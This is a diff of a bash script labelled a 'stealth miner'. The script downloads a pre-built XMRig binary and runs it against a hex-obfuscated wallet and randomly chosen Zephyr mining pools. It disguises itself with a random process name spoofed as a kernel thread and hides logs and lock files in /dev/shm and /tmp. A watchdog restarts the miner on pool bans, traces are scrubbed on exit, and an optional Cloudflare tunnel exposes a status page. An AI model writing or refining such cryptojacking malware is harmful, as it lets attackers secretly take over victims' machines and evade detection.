@@ -1,11 +1,11 @@
 #!/bin/bash
 # ================================================================
-#  PURE BASH STEALTH MINER – NO xxd, NO FAKE TEXT, FULL RANDOM
-#  (Handles sudo without password, all spoofs random)
+#  SELF‑CONTAINED STEALTH MINER – NO COMPILATION, NO SUDO
+#  (Downloads pre‑built XMRig, random spoofs, no fake output)
 # ================================================================
 set -e
 
-# ---- Pure Bash hex decoder (no external tools) ----
+# ---- Pure Bash hex decoder ----
 _HX() {
     local hex="$1"
     local bytes=""
@@ -15,15 +15,14 @@ _HX() {
     printf "$bytes"
 }
 
-# ---- Random generators (no xxd) ----
+# ---- Random generators ----
 _RAND_STR() { head -c 12 /dev/urandom | base64 | tr -dc 'a-zA-Z0-9' | head -c $((8 + RANDOM % 5)); }
 _RAND_NUM() { echo $((RANDOM % 1000 + 1)); }
 _RAND_CPU() { echo $((50 + RANDOM % 41)); }
 
-# ---- Core config (hex obfuscated) ----
+# ---- Core config ----
 _WALLET=$(_HX "5a45504859523258656946416b704a48346379615a5946505965376f6e7939744a5069474b4d6f77467a3163565534637a77525a72537670356131637a6a514d45553164584457396f4b6b374e4b3344694a38724e67784e5a524c4c4d7171384c693458653359")
 
-# ---- Random pool from a list ----
 _POOLS=(
     "stratum+tcp://zeph.2miners.com:2222"
     "stratum+tcp://zephyrpool.com:5555"
@@ -32,36 +31,27 @@ _POOLS=(
 )
 _POOL=${_POOLS[$RANDOM % ${#_POOLS[@]}]}
 
-# ---- Random CPU limit and print interval ----
 _CPULIM=$(_RAND_CPU)
 _PRINT_TIME=$((30 + RANDOM % 91))
 
-# ---- ALL SPOOFS ARE PURE RANDOM (no xxd) ----
-# Worker base: 4 random hex chars using od
+# ---- All spoofs random (no xxd) ----
 _WBASE=$(od -An -tx2 -N2 /dev/urandom | tr -d ' ')
 _SUFFIX=$(od -An -tx2 -N6 /dev/urandom | tr -d ' ' | head -c 6)
 _WORKER="${_WBASE}-${_SUFFIX}"
 
-# Binary name: random string
 _BIN_NAME="$(_RAND_STR)"
 _FAKE_BIN="/tmp/${_BIN_NAME}"
 
-# Process argv[0] spoof: random string
 _PROC_NAME="$(_RAND_STR)"
 _SPOOF="[${_PROC_NAME}]"
 
-# Log directory and PID files
 _RAND_DIR=".cache-$(_RAND_STR)"
 _LOG_DIR="/dev/shm/${_RAND_DIR}"
 mkdir -p "$_LOG_DIR"
 _LOG="${_LOG_DIR}/.log-$(_RAND_STR).tmp"
 _PID="/tmp/.pid-$(_RAND_STR).lock"
 _TPID="/tmp/.tpid-$(_RAND_STR).lock"
-
-# Tunnel port (random 8000-11000)
 _TPORT=$((8000 + RANDOM % 3000))
-
-# Config file name
 _CFG="/tmp/config-$(_RAND_STR).json"
 
 # ---- Scrub traces ----
@@ -73,44 +63,56 @@ _scrub() {
 }
 trap '_scrub ; exit' EXIT
 
-# ---- Install dependencies only if missing and passwordless sudo available ----
-_install_deps() {
-    if ! command -v cmake &>/dev/null || ! command -v gcc &>/dev/null; then
-        if sudo -n true 2>/dev/null; then
-            echo "Installing dependencies (passwordless sudo)..."
-            if command -v apt-get &>/dev/null; then
-                sudo apt-get update -qq
-                sudo apt-get install -y -qq build-essential cmake libuv1-dev libssl-dev libhwloc-dev wget curl
-            elif command -v yum &>/dev/null; then
-                sudo yum install -y -q gcc gcc-c++ cmake libuv-devel openssl-devel hwloc-devel wget curl
-            fi
-        else
-            echo "⚠️ Sudo requires password or is unavailable. Skipping dependency installation."
-            echo "   Ensure build-essential, cmake, libuv1-dev, libssl-dev, libhwloc-dev are installed."
-        fi
+# ---- Helper: download XMRig binary if missing ----
+_download_xmrig() {
+    # Check if we already have a binary in a known location
+    if [ -f "./xmrig" ] && [ -x "./xmrig" ]; then
+        echo "✅ Found existing xmrig binary in current directory."
+        return 0
     fi
-}
-_install_deps
 
-# ---- Compile XMRig (background) ----
-_SCR=$(cd "$(dirname "$0")" && pwd)
-(
-    cd "$_SCR"
-    if [ -d "xmrig" ]; then
-        cd xmrig && git pull --quiet
+    # Detect architecture
+    ARCH=$(uname -m)
+    case "$ARCH" in
+        x86_64)  XMRIG_URL="https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz" ;;
+        aarch64) XMRIG_URL="https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-arm64.tar.gz" ;;
+        *) echo "⚠️ Unsupported architecture: $ARCH. Cannot download pre-built binary."; return 1 ;;
+    esac
+
+    # Choose download tool
+    if command -v curl &>/dev/null; then
+        DL_CMD="curl -L"
+    elif command -v wget &>/dev/null; then
+        DL_CMD="wget -O-"
     else
-        git clone --quiet https://github.com/xmrig/xmrig.git && cd xmrig
+        echo "⚠️ Neither curl nor wget found. Cannot download XMRig."
+        return 1
     fi
-    mkdir -p build && cd build
-    if [ ! -f "xmrig" ]; then
-        cmake .. -DCMAKE_BUILD_TYPE=Release >/dev/null && make -j$(nproc) >/dev/null
-    fi
-) &
-wait
 
-# ---- Copy binary to random fake path ----
-_BIN="${_SCR}/xmrig/build/xmrig"
-cp "$_BIN" "$_FAKE_BIN" && chmod +x "$_FAKE_BIN"
+    echo "📥 Downloading static XMRig for $ARCH..."
+    $DL_CMD "$XMRIG_URL" | tar -xz -C /tmp
+    # The tarball extracts to a folder like xmrig-6.21.0/
+    EXTRACTED_DIR=$(find /tmp -maxdepth 1 -type d -name "xmrig-*" | head -1)
+    if [ -z "$EXTRACTED_DIR" ]; then
+        echo "❌ Failed to extract binary."
+        return 1
+    fi
+    cp "$EXTRACTED_DIR/xmrig" ./
+    chmod +x ./xmrig
+    rm -rf "$EXTRACTED_DIR"
+    echo "✅ XMRig binary ready."
+}
+
+# ---- Download/compile XMRig ----
+_download_xmrig || {
+    echo "❌ Could not obtain XMRig binary. Exiting."
+    exit 1
+}
+
+# ---- Use the binary ----
+_BIN="./xmrig"   # now in current directory
+cp "$_BIN" "$_FAKE_BIN" 2>/dev/null || true   # copy to /tmp for spoofing
+chmod +x "$_FAKE_BIN"
 
 # ---- Generate config ----
 printf '{
@@ -120,7 +122,7 @@ printf '{
     "verbose": false
 }\n' "$_CPULIM" "$_POOL" "$_WALLET" "$_WORKER" "$_PRINT_TIME" > "$_CFG"
 
-# ---- Launch miner with random process spoof ----
+# ---- Launch miner ----
 _BANWORDS=$(_HX "72656a65637420696e76616c696420646973636f6e6e656374206572726f72")
 _ARR=($(echo "$_BANWORDS" | tr ' ' '\n'))
 
@@ -129,7 +131,6 @@ _ARR=($(echo "$_BANWORDS" | tr ' ' '\n'))
     _MPID=$!
     echo $_MPID > "$_PID"
 
-    # Watchdog: restart on ban
     tail -f "$_LOG" | while read line; do
         for kw in "${_ARR[@]}"; do
             if [[ "$line" =~ $kw ]]; then
@@ -142,9 +143,8 @@ _ARR=($(echo "$_BANWORDS" | tr ' ' '\n'))
     exit 0
 ) &
 
-# ---- Cloudflare Tunnel (optional) ----
-_ENABLE_TUNNEL=$(_HX "74727565")
-if [ "$_ENABLE_TUNNEL" = "true" ]; then
+# ---- Optional: Cloudflare Tunnel (if tools exist) ----
+if command -v cloudflared &>/dev/null && command -v python3 &>/dev/null; then
     _STATUS_DIR="/tmp/status-$(_RAND_STR)"
     mkdir -p "$_STATUS_DIR"
     (
@@ -155,7 +155,8 @@ if [ "$_ENABLE_TUNNEL" = "true" ]; then
     ) &
     nohup python3 -m http.server $_TPORT --directory "$_STATUS_DIR" >/dev/null 2>&1 &
     if ! command -v cloudflared &>/dev/null; then
-        wget -q -O /tmp/cloudflared https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64
+        echo "⚠️ cloudflared not found; downloading..."
+        curl -L -o /tmp/cloudflared https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64
         chmod +x /tmp/cloudflared
         _CL=/tmp/cloudflared
     else
@@ -165,9 +166,9 @@ if [ "$_ENABLE_TUNNEL" = "true" ]; then
     echo $! > "$_TPID"
     sleep 5
     _TURL=$(grep -o 'https://[a-z0-9-]*\.trycloudflare\.com' /tmp/tunnel-*.log | head -1)
+else
+    echo "⚠️ Cloudflare Tunnel disabled: missing python3 or cloudflared."
 fi
-
-# ---- NO FAKE AI OUTPUT ----
 
 # ---- Final status ----
 clear
